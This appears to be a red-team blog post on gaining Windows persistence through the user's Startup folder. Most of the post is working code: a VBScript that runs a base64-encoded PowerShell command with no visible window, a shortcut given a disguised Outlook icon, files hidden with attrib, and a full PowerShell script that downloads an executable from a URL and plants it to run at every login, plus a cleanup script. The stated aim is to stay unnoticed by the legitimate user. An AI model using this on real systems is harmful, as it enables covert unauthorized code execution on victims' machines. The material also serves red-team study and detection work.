---
layout: post
title: Persistence using Startup Folder
excerpt_separator: <!--more-->
---

One of the most simple persistence methods when you have access as a non-administrative user is using the Startup folder. However, it is not so easy to go completely unnoticed by the legitimate user.

<!--more-->


Gists: 

- [Script to create files](https://gist.github.com/ricardojoserf/d021310080ea34c8c6187d82065dde85)

- [Script to delete files](https://gist.github.com/ricardojoserf/6e1a242e77a52c78b630af22d5709153)

<br>

-------------------------------------------


## Intro

The easiest way to set this persistence method is dropping a file in the Startup Folder of the user, which is in the path:

```
C:\Users\USER\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

This file can be an executable program (".exe" extension) but it can also be a Batch script (".bat" extension), Powershell script (".ps1" extension) or even a file shortcut (".lnk" extension). So if, for example, you copy the calc.exe binary from C:\Windows\System32\calc.exe to the mentioned Startup folder path, next time the user logs into the computer the calculator application will pop up.

From a non-attacker perspective, it is common to see big organizations using this and other similar techniques to make all the employee laptops to launch specific programs when the Operating System (usually Windows) starts. In this case, one approach is using shortcuts to open each of these programs: Teams, Outlook, Chrome...

<br>

## Executing a EXE without a window popping up

##### First fail: Powershell's window style hidden

For this specific case, we find a laptop where there are shortcuts to open some programs in the Startup folder, which open all the programs the employee needs for its daily work. However, even if the user uses Outlook everyday, there is not a shortcut for the program.

Furthermore, our goal is to run a .exe file every time the user boots the computer without any cmd window popping up, so first I tried to create a Batch file to execute the EXE file in the path:

```
C:\Users\USER\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UpdateOutlook.bat
```

The content of the file executes a Powershell command which executes the program in the path "c:\temp\OutlookUpdate.exe" and hides the window (that is why we use "-windowstyle hidden"):

```
powershell -windowstyle hidden -command c:\temp\OutlookUpdate.exe
```

What is the biggest problem with this approach? Even if you run this in an good, new, optimized computer, the window will pop up even if it is for half a second. If the computer is older, the time the window appears in the screen will be longer, and having the previous Powershell command for more than 15 seconds in the user's screen is probably not the most OPSEC option. 

Could we encode the Powershell command? Of course we could, but it is even better if we avoid the window appearing even for half a second.


##### Changing Powershell for VBScript

For that we will use a .VBS script, which will not pop any cmd window. For example, the following script will execute an encoded powershell command which will call "c:\ProgramData\Outlook\OutlookUpdate.exe". If we create a .VBS script with this content in the Startup folder, the program will get executed and there will be no window popping the user could ever see:

```
Set objShell = WScript.CreateObject(""WScript.Shell"")
objShell.Run(""powershell -e YwA6AFwAUAByAG8AZwByAGEAbQBEAGEAdABhAFwATwB1AHQAbABvAG8AawBcAE8AdQB0AGwAbwBvAGsAVQBwAGQAYQB0AGUALgBlAHgAZQA=""), 0, True
```


##### Shortcut files

But, knowing the folder contains mostly shortcuts, maybe it makes more sense if the .VBS script is generated in other folder and we just leave a shortcut to it in the Startup folder. 

Furthermore, we will change the shortcut icon to a more reliable-looking one. We can do this using WScript:

```
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$($env:USERPROFILE)\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\$LnkFile")
wget $Url/$IcoFile -Outfile $Dir\$IcoFile
$Shortcut.TargetPath = "$Dir\$VbsFile"
$Shortcut.IconLocation = "$Dir\$IcoFile"
$Shortcut.Save()
```

##### Hidden files

Finally, we know we will have four files:

- The shortcut file in the Startup folder.
- The icon file used by the shortcut file.
- The VBScript file called by the shortcut.
- The EXE file we wanted to execute in the system at startup.

We will drop the icon and EXE file and generate the shortcut and VBScript file, and the four files will be on disk. 

We can use the "hidden" attribute so the files are not visible in the folder (by default, but you probably have File Explorer configured to see hidden items) or running "dir" (you should run "dir /a" to see these files). We could use:

```
attrib -h C:\ProgramData\Outlook\OutlookUpdate.exe
```


It is important to notice that the shortcut file can not be "hidden", but the icon, VBScript and EXE files can.

<br>

## Final scripts

This process is automated in the following script:


```
$Url = "http://127.0.0.1:8080"
$Dir="C:\ProgramData\Outlook"
$ExeFile = "notmalicious.exe"
$VbsFile = "CheckUpdate.vbs"
$LnkFile = "Outlook.lnk"
$IcoFile = "microsoft-outlook.ico"

## Create directory
echo "Creating directory $Dir"
mkdir $Dir

## Download and hide .exe
wget $Url/$ExeFile -Outfile $Dir\$ExeFile
attrib +h $Dir\$ExeFile
cmd /c "dir $Dir"
cmd /c "dir /a $Dir"

## Create .vbs
$B64Path = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Dir+"/"+$ExeFile))
echo $B64Path
cmd /c "echo Set objShell = WScript.CreateObject(""WScript.Shell"") > ""$Dir\$VbsFile"""
cmd /c "echo objShell.Run(""powershell -e $B64Path""), 0, True >> ""$Dir\$VbsFile"""

## Download .ico and create .lnk
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$($env:USERPROFILE)\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\$LnkFile")
wget $Url/$IcoFile -Outfile $Dir\$IcoFile
$Shortcut.TargetPath = "$Dir\$VbsFile"
$Shortcut.IconLocation = "$Dir\$IcoFile"
$Shortcut.Save()

## Hide .vbs and .ico
attrib +h "$Dir\$VbsFile"
attrib +h $Dir\$IcoFile
cmd /c "dir ""$Dir"""
cmd /c "dir /a ""$Dir"""
type "$Dir\$VbsFile"
cmd /c "dir /a ""$($env:USERPROFILE)\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"""
```


And this is the script to delete the files:

```
$Dir="C:\ProgramData\Outlook"
$ExeFile = "notmalicious.exe"
$VbsFile = "CheckUpdate.vbs"
$LnkFile = "Outlook.lnk"
$IcoFile = "microsoft-outlook.ico"

## Unhidden and delete files from Dir
cmd /c "dir /a $Dir"
attrib -h $Dir\$ExeFile
attrib -h $Dir\$VbsFile
attrib -h $Dir\$IcoFile
del $Dir\$ExeFile
del $Dir\$VbsFile
del $Dir\$IcoFile
cmd /c "dir /a $Dir"

## Delete .lnk
del "$($env:USERPROFILE)\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\$LnkFile"
cmd /c "dir /a ""$($env:USERPROFILE)\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"""
```

However, before deleting these files the program must be stopped if it is already running:

```
tasklist | findstr notmalicious.exe
taskkill /f /pid PID
```

<br>
